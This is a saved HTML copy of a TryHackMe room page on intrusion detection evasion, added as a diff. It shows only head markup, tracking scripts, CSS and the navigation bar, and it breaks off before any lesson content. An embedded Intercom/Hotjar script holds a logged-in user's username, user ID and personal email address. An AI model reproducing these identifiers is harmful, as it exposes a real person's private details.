@@ -1,0 +1,2900 @@
+<!DOCTYPE html>
+<!-- saved from url=(0037)https://tryhackme.com/room/idsevasion -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>TryHackMe | Intrusion Detection </title>
+<meta name="description" content="Learn cyber evasion techniques and put them to the test against two IDS">
+<meta name="og:description" content="Learn cyber evasion techniques and put them to the test against two IDS">
+<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<meta property="og:site_name" content="TryHackMe">
+<meta property="og:title" content="TryHackMe | Intrusion Detection ">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/9f5785fc9979f57ec0df40f2f06d8f2b.png">
+<meta property="og:url" content="https://tryhackme.com/room/idsevasion">
+<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
+<meta property="og:description" content="Learn cyber evasion techniques and put them to the test against two IDS">
+
+<script src="./TryHackMe _ Intrusion Detection_files/jquery.min.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/popper.min.js"></script>
+<link rel="stylesheet" href="./TryHackMe _ Intrusion Detection_files/boostrap431.min.css">
+<script src="./TryHackMe _ Intrusion Detection_files/bootstrap431.min.js"></script>
+<link rel="stylesheet" href="./TryHackMe _ Intrusion Detection_files/animate.min.css">
+<link rel="stylesheet" href="./TryHackMe _ Intrusion Detection_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
+<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
+<link rel="stylesheet" media="screen" href="./TryHackMe _ Intrusion Detection_files/general-style.css">
+<script src="./TryHackMe _ Intrusion Detection_files/script.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/validation.js"></script>
+
+<link rel="stylesheet" type="text/css" href="./TryHackMe _ Intrusion Detection_files/cookieconsent.min.css">
+<script src="./TryHackMe _ Intrusion Detection_files/cookieconsent.min.js"></script>
+<script async="" src="./TryHackMe _ Intrusion Detection_files/js"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+  
+    gtag('config', 'G-Z8D4WL3D4P');
+  </script>
+
+
+<script>
+    window.intercomSettings = {
+      api_base: "https://api-iam.intercom.io",
+      app_id: "pgpbhph6"
+    };
+  </script>
+<script>
+    (function (h, o, t, j, a, r) {
+      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
+      h._hjSettings = { hjid: 1950941, hjsv: 6 };
+      a = o.getElementsByTagName('head')[0];
+      r = o.createElement('script'); r.async = 1;
+      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
+      a.appendChild(r);
+    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
+  </script><script async="" src="./TryHackMe _ Intrusion Detection_files/hotjar-1950941.js"></script>
+<script>
+    /* Global javascript variables */
+
+    // Used inside script.js for createRooms compelted users.
+    const username = 'Silv3rsurf3r'
+    const subscribed = '1'
+    const level = '10'
+    const intercomEnabled = 'true'
+  </script>
+<script>
+    //add back tracking info
+    const userId = "63d14e7f857ae10041bb192f"
+    let tutorialComplete = false
+    if ('false' == "true") {
+      tutorialComplete = true
+    }
+    if(intercomEnabled === "true"){
+      window.intercomSettings = {
+        api_base: "https://api-iam.intercom.io",
+        app_id: "pgpbhph6",
+        user_id: userId,
+        username: username,
+        email: "giftonpaul@karunya.edu.in",
+        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
+      };
+    }
+    window.hj('identify', userId, {
+      displayName: username,
+      subscribed: "1",
+      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
+      experience: "advanced"
+    })
+  </script>
+<script type="application/ld+json">
+
+   {
+      "@context":"https://schema.org",
+      "@type":"Organization",
+      "url":"https://tryhackme.com",
+      "name":"TryHackMe",
+      "logo":"https://tryhackme.com/img/favicon.png",
+      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
+      "email": "support@tryhackme.com",
+      "sameAs":[
+         "https://www.linkedin.com/company/tryhackme",
+         "https://twitter.com/realtryhackme"
+      ]
+   }
+
+</script>
+<script>
+    console.log(`%c
+      ------------------
+      < Happy Hacking! >
+      ------------------
+              \\   ^__^
+               \\  (oo)\\_______
+                  (__)\\       )\\/\\
+                      ||----w |
+                      ||     ||`, "font-family:monospace")
+  </script>
+<script>
+  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
+</script>
+<script src="./TryHackMe _ Intrusion Detection_files/socket.io.js"></script><script>
+  let socket = io.connect({
+    transports: ['websocket'],
+    reconnection: true,
+    reconnectionDelay: 1000,
+    reconnectionAttempts: 10
+  })
+</script><script async="" src="./TryHackMe _ Intrusion Detection_files/modules.85ce248fb47f3a28349a.js" charset="utf-8"></script><style type="text/css">.apexcharts-canvas {
+  position: relative;
+  user-select: none;
+  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
+}
+
+
+/* scrollbar is not visible by default for legend, hence forcing the visibility */
+.apexcharts-canvas ::-webkit-scrollbar {
+  -webkit-appearance: none;
+  width: 6px;
+}
+
+.apexcharts-canvas ::-webkit-scrollbar-thumb {
+  border-radius: 4px;
+  background-color: rgba(0, 0, 0, .5);
+  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
+  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
+}
+
+
+.apexcharts-inner {
+  position: relative;
+}
+
+.apexcharts-text tspan {
+  font-family: inherit;
+}
+
+.legend-mouseover-inactive {
+  transition: 0.15s ease all;
+  opacity: 0.20;
+}
+
+.apexcharts-series-collapsed {
+  opacity: 0;
+}
+
+.apexcharts-tooltip {
+  border-radius: 5px;
+  box-shadow: 2px 2px 6px -4px #999;
+  cursor: default;
+  font-size: 14px;
+  left: 62px;
+  opacity: 0;
+  pointer-events: none;
+  position: absolute;
+  top: 20px;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  white-space: nowrap;
+  z-index: 12;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-tooltip.apexcharts-active {
+  opacity: 1;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-tooltip.apexcharts-theme-light {
+  border: 1px solid #e3e3e3;
+  background: rgba(255, 255, 255, 0.96);
+}
+
+.apexcharts-tooltip.apexcharts-theme-dark {
+  color: #fff;
+  background: rgba(30, 30, 30, 0.8);
+}
+
+.apexcharts-tooltip * {
+  font-family: inherit;
+}
+
+
+.apexcharts-tooltip-title {
+  padding: 6px;
+  font-size: 15px;
+  margin-bottom: 4px;
+}
+
+.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
+  background: #ECEFF1;
+  border-bottom: 1px solid #ddd;
+}
+
+.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
+  background: rgba(0, 0, 0, 0.7);
+  border-bottom: 1px solid #333;
+}
+
+.apexcharts-tooltip-text-y-value,
+.apexcharts-tooltip-text-goals-value,
+.apexcharts-tooltip-text-z-value {
+  display: inline-block;
+  font-weight: 600;
+  margin-left: 5px;
+}
+
+.apexcharts-tooltip-text-y-label:empty,
+.apexcharts-tooltip-text-y-value:empty,
+.apexcharts-tooltip-text-goals-label:empty,
+.apexcharts-tooltip-text-goals-value:empty,
+.apexcharts-tooltip-text-z-value:empty {
+  display: none;
+}
+
+.apexcharts-tooltip-text-y-value,
+.apexcharts-tooltip-text-goals-value,
+.apexcharts-tooltip-text-z-value {
+  font-weight: 600;
+}
+
+.apexcharts-tooltip-text-goals-label, 
+.apexcharts-tooltip-text-goals-value {
+  padding: 6px 0 5px;
+}
+
+.apexcharts-tooltip-goals-group, 
+.apexcharts-tooltip-text-goals-label, 
+.apexcharts-tooltip-text-goals-value {
+  display: flex;
+}
+.apexcharts-tooltip-text-goals-label:not(:empty),
+.apexcharts-tooltip-text-goals-value:not(:empty) {
+  margin-top: -6px;
+}
+
+.apexcharts-tooltip-marker {
+  width: 12px;
+  height: 12px;
+  position: relative;
+  top: 0px;
+  margin-right: 10px;
+  border-radius: 50%;
+}
+
+.apexcharts-tooltip-series-group {
+  padding: 0 10px;
+  display: none;
+  text-align: left;
+  justify-content: left;
+  align-items: center;
+}
+
+.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
+  opacity: 1;
+}
+
+.apexcharts-tooltip-series-group.apexcharts-active,
+.apexcharts-tooltip-series-group:last-child {
+  padding-bottom: 4px;
+}
+
+.apexcharts-tooltip-series-group-hidden {
+  opacity: 0;
+  height: 0;
+  line-height: 0;
+  padding: 0 !important;
+}
+
+.apexcharts-tooltip-y-group {
+  padding: 6px 0 5px;
+}
+
+.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
+  padding: 4px 8px;
+}
+
+.apexcharts-tooltip-boxPlot {
+  display: flex;
+  flex-direction: column-reverse;
+}
+
+.apexcharts-tooltip-box>div {
+  margin: 4px 0;
+}
+
+.apexcharts-tooltip-box span.value {
+  font-weight: bold;
+}
+
+.apexcharts-tooltip-rangebar {
+  padding: 5px 8px;
+}
+
+.apexcharts-tooltip-rangebar .category {
+  font-weight: 600;
+  color: #777;
+}
+
+.apexcharts-tooltip-rangebar .series-name {
+  font-weight: bold;
+  display: block;
+  margin-bottom: 5px;
+}
+
+.apexcharts-xaxistooltip {
+  opacity: 0;
+  padding: 9px 10px;
+  pointer-events: none;
+  color: #373d3f;
+  font-size: 13px;
+  text-align: center;
+  border-radius: 2px;
+  position: absolute;
+  z-index: 10;
+  background: #ECEFF1;
+  border: 1px solid #90A4AE;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-xaxistooltip.apexcharts-theme-dark {
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(0, 0, 0, 0.5);
+  color: #fff;
+}
+
+.apexcharts-xaxistooltip:after,
+.apexcharts-xaxistooltip:before {
+  left: 50%;
+  border: solid transparent;
+  content: " ";
+  height: 0;
+  width: 0;
+  position: absolute;
+  pointer-events: none;
+}
+
+.apexcharts-xaxistooltip:after {
+  border-color: rgba(236, 239, 241, 0);
+  border-width: 6px;
+  margin-left: -6px;
+}
+
+.apexcharts-xaxistooltip:before {
+  border-color: rgba(144, 164, 174, 0);
+  border-width: 7px;
+  margin-left: -7px;
+}
+
+.apexcharts-xaxistooltip-bottom:after,
+.apexcharts-xaxistooltip-bottom:before {
+  bottom: 100%;
+}
+
+.apexcharts-xaxistooltip-top:after,
+.apexcharts-xaxistooltip-top:before {
+  top: 100%;
+}
+
+.apexcharts-xaxistooltip-bottom:after {
+  border-bottom-color: #ECEFF1;
+}
+
+.apexcharts-xaxistooltip-bottom:before {
+  border-bottom-color: #90A4AE;
+}
+
+.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
+  border-bottom-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
+  border-bottom-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-xaxistooltip-top:after {
+  border-top-color: #ECEFF1
+}
+
+.apexcharts-xaxistooltip-top:before {
+  border-top-color: #90A4AE;
+}
+
+.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
+  border-top-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
+  border-top-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-xaxistooltip.apexcharts-active {
+  opacity: 1;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-yaxistooltip {
+  opacity: 0;
+  padding: 4px 10px;
+  pointer-events: none;
+  color: #373d3f;
+  font-size: 13px;
+  text-align: center;
+  border-radius: 2px;
+  position: absolute;
+  z-index: 10;
+  background: #ECEFF1;
+  border: 1px solid #90A4AE;
+}
+
+.apexcharts-yaxistooltip.apexcharts-theme-dark {
+  background: rgba(0, 0, 0, 0.7);
+  border: 1px solid rgba(0, 0, 0, 0.5);
+  color: #fff;
+}
+
+.apexcharts-yaxistooltip:after,
+.apexcharts-yaxistooltip:before {
+  top: 50%;
+  border: solid transparent;
+  content: " ";
+  height: 0;
+  width: 0;
+  position: absolute;
+  pointer-events: none;
+}
+
+.apexcharts-yaxistooltip:after {
+  border-color: rgba(236, 239, 241, 0);
+  border-width: 6px;
+  margin-top: -6px;
+}
+
+.apexcharts-yaxistooltip:before {
+  border-color: rgba(144, 164, 174, 0);
+  border-width: 7px;
+  margin-top: -7px;
+}
+
+.apexcharts-yaxistooltip-left:after,
+.apexcharts-yaxistooltip-left:before {
+  left: 100%;
+}
+
+.apexcharts-yaxistooltip-right:after,
+.apexcharts-yaxistooltip-right:before {
+  right: 100%;
+}
+
+.apexcharts-yaxistooltip-left:after {
+  border-left-color: #ECEFF1;
+}
+
+.apexcharts-yaxistooltip-left:before {
+  border-left-color: #90A4AE;
+}
+
+.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
+  border-left-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
+  border-left-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-yaxistooltip-right:after {
+  border-right-color: #ECEFF1;
+}
+
+.apexcharts-yaxistooltip-right:before {
+  border-right-color: #90A4AE;
+}
+
+.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
+  border-right-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
+  border-right-color: rgba(0, 0, 0, 0.5);
+}
+
+.apexcharts-yaxistooltip.apexcharts-active {
+  opacity: 1;
+}
+
+.apexcharts-yaxistooltip-hidden {
+  display: none;
+}
+
+.apexcharts-xcrosshairs,
+.apexcharts-ycrosshairs {
+  pointer-events: none;
+  opacity: 0;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-xcrosshairs.apexcharts-active,
+.apexcharts-ycrosshairs.apexcharts-active {
+  opacity: 1;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-ycrosshairs-hidden {
+  opacity: 0;
+}
+
+.apexcharts-selection-rect {
+  cursor: move;
+}
+
+.svg_select_boundingRect, .svg_select_points_rot {
+  pointer-events: none;
+  opacity: 0;
+  visibility: hidden;
+}
+.apexcharts-selection-rect + g .svg_select_boundingRect,
+.apexcharts-selection-rect + g .svg_select_points_rot {
+  opacity: 0;
+  visibility: hidden;
+}
+
+.apexcharts-selection-rect + g .svg_select_points_l,
+.apexcharts-selection-rect + g .svg_select_points_r {
+  cursor: ew-resize;
+  opacity: 1;
+  visibility: visible;
+}
+
+.svg_select_points {
+  fill: #efefef;
+  stroke: #333;
+  rx: 2;
+}
+
+.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
+  cursor: crosshair
+}
+
+.apexcharts-svg.apexcharts-zoomable.hovering-pan {
+  cursor: move
+}
+
+.apexcharts-zoom-icon,
+.apexcharts-zoomin-icon,
+.apexcharts-zoomout-icon,
+.apexcharts-reset-icon,
+.apexcharts-pan-icon,
+.apexcharts-selection-icon,
+.apexcharts-menu-icon,
+.apexcharts-toolbar-custom-icon {
+  cursor: pointer;
+  width: 20px;
+  height: 20px;
+  line-height: 24px;
+  color: #6E8192;
+  text-align: center;
+}
+
+.apexcharts-zoom-icon svg,
+.apexcharts-zoomin-icon svg,
+.apexcharts-zoomout-icon svg,
+.apexcharts-reset-icon svg,
+.apexcharts-menu-icon svg {
+  fill: #6E8192;
+}
+
+.apexcharts-selection-icon svg {
+  fill: #444;
+  transform: scale(0.76)
+}
+
+.apexcharts-theme-dark .apexcharts-zoom-icon svg,
+.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
+.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
+.apexcharts-theme-dark .apexcharts-reset-icon svg,
+.apexcharts-theme-dark .apexcharts-pan-icon svg,
+.apexcharts-theme-dark .apexcharts-selection-icon svg,
+.apexcharts-theme-dark .apexcharts-menu-icon svg,
+.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
+  fill: #f3f4f5;
+}
+
+.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
+.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
+.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
+  fill: #008FFB;
+}
+
+.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
+.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
+.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
+.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
+.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
+.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
+  fill: #333;
+}
+
+.apexcharts-selection-icon,
+.apexcharts-menu-icon {
+  position: relative;
+}
+
+.apexcharts-reset-icon {
+  margin-left: 5px;
+}
+
+.apexcharts-zoom-icon,
+.apexcharts-reset-icon,
+.apexcharts-menu-icon {
+  transform: scale(0.85);
+}
+
+.apexcharts-zoomin-icon,
+.apexcharts-zoomout-icon {
+  transform: scale(0.7)
+}
+
+.apexcharts-zoomout-icon {
+  margin-right: 3px;
+}
+
+.apexcharts-pan-icon {
+  transform: scale(0.62);
+  position: relative;
+  left: 1px;
+  top: 0px;
+}
+
+.apexcharts-pan-icon svg {
+  fill: #fff;
+  stroke: #6E8192;
+  stroke-width: 2;
+}
+
+.apexcharts-pan-icon.apexcharts-selected svg {
+  stroke: #008FFB;
+}
+
+.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
+  stroke: #333;
+}
+
+.apexcharts-toolbar {
+  position: absolute;
+  z-index: 11;
+  max-width: 176px;
+  text-align: right;
+  border-radius: 3px;
+  padding: 0px 6px 2px 6px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.apexcharts-menu {
+  background: #fff;
+  position: absolute;
+  top: 100%;
+  border: 1px solid #ddd;
+  border-radius: 3px;
+  padding: 3px;
+  right: 10px;
+  opacity: 0;
+  min-width: 110px;
+  transition: 0.15s ease all;
+  pointer-events: none;
+}
+
+.apexcharts-menu.apexcharts-menu-open {
+  opacity: 1;
+  pointer-events: all;
+  transition: 0.15s ease all;
+}
+
+.apexcharts-menu-item {
+  padding: 6px 7px;
+  font-size: 12px;
+  cursor: pointer;
+}
+
+.apexcharts-theme-light .apexcharts-menu-item:hover {
+  background: #eee;
+}
+
+.apexcharts-theme-dark .apexcharts-menu {
+  background: rgba(0, 0, 0, 0.7);
+  color: #fff;
+}
+
+@media screen and (min-width: 768px) {
+  .apexcharts-canvas:hover .apexcharts-toolbar {
+    opacity: 1;
+  }
+}
+
+.apexcharts-datalabel.apexcharts-element-hidden {
+  opacity: 0;
+}
+
+.apexcharts-pie-label,
+.apexcharts-datalabels,
+.apexcharts-datalabel,
+.apexcharts-datalabel-label,
+.apexcharts-datalabel-value {
+  cursor: default;
+  pointer-events: none;
+}
+
+.apexcharts-pie-label-delay {
+  opacity: 0;
+  animation-name: opaque;
+  animation-duration: 0.3s;
+  animation-fill-mode: forwards;
+  animation-timing-function: ease;
+}
+
+.apexcharts-canvas .apexcharts-element-hidden {
+  opacity: 0;
+}
+
+.apexcharts-hide .apexcharts-series-points {
+  opacity: 0;
+}
+
+.apexcharts-gridline,
+.apexcharts-annotation-rect,
+.apexcharts-tooltip .apexcharts-marker,
+.apexcharts-area-series .apexcharts-area,
+.apexcharts-line,
+.apexcharts-zoom-rect,
+.apexcharts-toolbar svg,
+.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
+.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
+.apexcharts-radar-series path,
+.apexcharts-radar-series polygon {
+  pointer-events: none;
+}
+
+
+/* markers */
+
+.apexcharts-marker {
+  transition: 0.15s ease all;
+}
+
+@keyframes opaque {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+
+
+/* Resize generated styles */
+
+@keyframes resizeanim {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 0;
+  }
+}
+
+.resize-triggers {
+  animation: 1ms resizeanim;
+  visibility: hidden;
+  opacity: 0;
+}
+
+.resize-triggers,
+.resize-triggers>div,
+.contract-trigger:before {
+  content: " ";
+  display: block;
+  position: absolute;
+  top: 0;
+  left: 0;
+  height: 100%;
+  width: 100%;
+  overflow: hidden;
+}
+
+.resize-triggers>div {
+  background: #eee;
+  overflow: auto;
+}
+
+.contract-trigger:before {
+  width: 200%;
+  height: 200%;
+}</style><style data-jss="" data-meta="MuiDialog">
+@media print {
+  .MuiDialog-root {
+    position: absolute !important;
+  }
+}
+.MuiDialog-scrollPaper {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.MuiDialog-scrollBody {
+  overflow-x: hidden;
+  overflow-y: auto;
+  text-align: center;
+}
+.MuiDialog-scrollBody:after {
+  width: 0;
+  height: 100%;
+  content: "";
+  display: inline-block;
+  vertical-align: middle;
+}
+.MuiDialog-container {
+  height: 100%;
+  outline: 0;
+}
+@media print {
+  .MuiDialog-container {
+    height: auto;
+  }
+}
+.MuiDialog-paper {
+  margin: 32px;
+  position: relative;
+  overflow-y: auto;
+}
+@media print {
+  .MuiDialog-paper {
+    box-shadow: none;
+    overflow-y: visible;
+  }
+}
+.MuiDialog-paperScrollPaper {
+  display: flex;
+  max-height: calc(100% - 64px);
+  flex-direction: column;
+}
+.MuiDialog-paperScrollBody {
+  display: inline-block;
+  text-align: left;
+  vertical-align: middle;
+}
+.MuiDialog-paperWidthFalse {
+  max-width: calc(100% - 64px);
+}
+.MuiDialog-paperWidthXs {
+  max-width: 444px;
+}
+@media (max-width:507.95px) {
+  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperWidthSm {
+  max-width: 600px;
+}
+@media (max-width:663.95px) {
+  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperWidthMd {
+  max-width: 960px;
+}
+@media (max-width:1023.95px) {
+  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperWidthLg {
+  max-width: 1280px;
+}
+@media (max-width:1343.95px) {
+  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperWidthXl {
+  max-width: 1920px;
+}
+@media (max-width:1983.95px) {
+  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
+    max-width: calc(100% - 64px);
+  }
+}
+.MuiDialog-paperFullWidth {
+  width: calc(100% - 64px);
+}
+.MuiDialog-paperFullScreen {
+  width: 100%;
+  height: 100%;
+  margin: 0;
+  max-width: 100%;
+  max-height: none;
+  border-radius: 0;
+}
+.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
+  margin: 0;
+  max-width: 100%;
+}
+</style></head>
+
+
+<body>
+<link href="./TryHackMe _ Intrusion Detection_files/scoreboard.css" rel="stylesheet" type="text/css">
+<link href="./TryHackMe _ Intrusion Detection_files/introjs.css" rel="stylesheet" type="text/css">
+<link href="./TryHackMe _ Intrusion Detection_files/slideout.css" rel="stylesheet" type="text/css">
+<link href="./TryHackMe _ Intrusion Detection_files/public-rooms.css" rel="stylesheet" type="text/css">
+<link href="./TryHackMe _ Intrusion Detection_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
+<link href="./TryHackMe _ Intrusion Detection_files/prism.css" rel="stylesheet" type="text/css"> 
+<link href="./TryHackMe _ Intrusion Detection_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
+<script src="./TryHackMe _ Intrusion Detection_files/lottie-player.js"></script>
+
+<div id="room-content">
+<div id="room-content-main">
+<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
+<div class="container">
+<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
+<span class="thm-nav__hamburger-lines"></span>
+</button>
+<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
+<div class="navbar-brand" href="/">
+<a href="https://tryhackme.com/dashboard">
+<img width="115px" src="./TryHackMe _ Intrusion Detection_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
+</a>
+</div>
+<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
+<li class="nav-item ">
+<a class="nav-link" href="https://tryhackme.com/dashboard">
+<i class="navbar-item-icon far fa-browser"></i>
+<div class="navbar-item-text">Dashboard</div>
+</a>
+</li>
+<li class="nav-item active" id="nav-learn">
+<a class="nav-link" href="https://tryhackme.com/hacktivities">
+<i class="navbar-item-icon far fa-book-open"></i>
+<div class="navbar-item-text">Learn</div>
+</a>
+</li>
+<li class="nav-item  dropdown lite-removable">
+<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/idsevasion#" data-toggle="dropdown">
+<i class="navbar-item-icon far fa-trophy"></i>
+<div class="navbar-item-text">Compete</div>
+</a>
+<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
+<div class="dropdown-menu-icon">
+<i class="fas fa-trophy"></i>
+</div>
+<div class="dropdown-menu-desc">
+<span class="mb-0">Leaderboards</span>
+<div class="text-lgray size-12">Platform Rankings</div>
+</div>
+</a>
+<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
+<div class="dropdown-menu-icon">
+<i class="fas fa-crown"></i>
+</div>
+<div class="dropdown-menu-desc">
+<span class="mb-0">King of the Hill</span>
+<div class="text-lgray size-12">Attack &amp; Defend</div>
+</div>
+</a>
+<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
+<div class="dropdown-menu-icon">
+<i class="fas fa-user-friends"></i>
+</div>
+<div class="dropdown-menu-desc">
+<span class="mb-0">Workspace</span>
+<div class="text-lgray size-12">Compete &amp; Collaborate</div>
+</div>
+</a>
+</div>
+</li>
+<li class="nav-item dropdown">
+<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/idsevasion#" data-toggle="dropdown">
+<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
+<div class="navbar-item-text">Other</div>
+</a>
+<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
+<span class="dropdown-menu-arrow"></span>
+<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
+<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
+<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
+<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
+<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
+<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
+<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
+</div>
+</li>
+</ul>
+<ul class="navbar-nav navbar-right options vertical-align-custom">
+<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
+<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
+<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
+</div>
+</li>
+<li class="nav-item">
+<div class="nav-item-streak">
+<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;
+
+&lt;div class=&#39;size-12 faded&#39;&gt;
+  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
+    Access to networks, Streak freeze&lt;/p&gt;
+  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
+    Streak freeze&lt;/p&gt;
+  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
+&lt;/div&gt;
+ &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
+        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
+<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
+</span>
+<script>
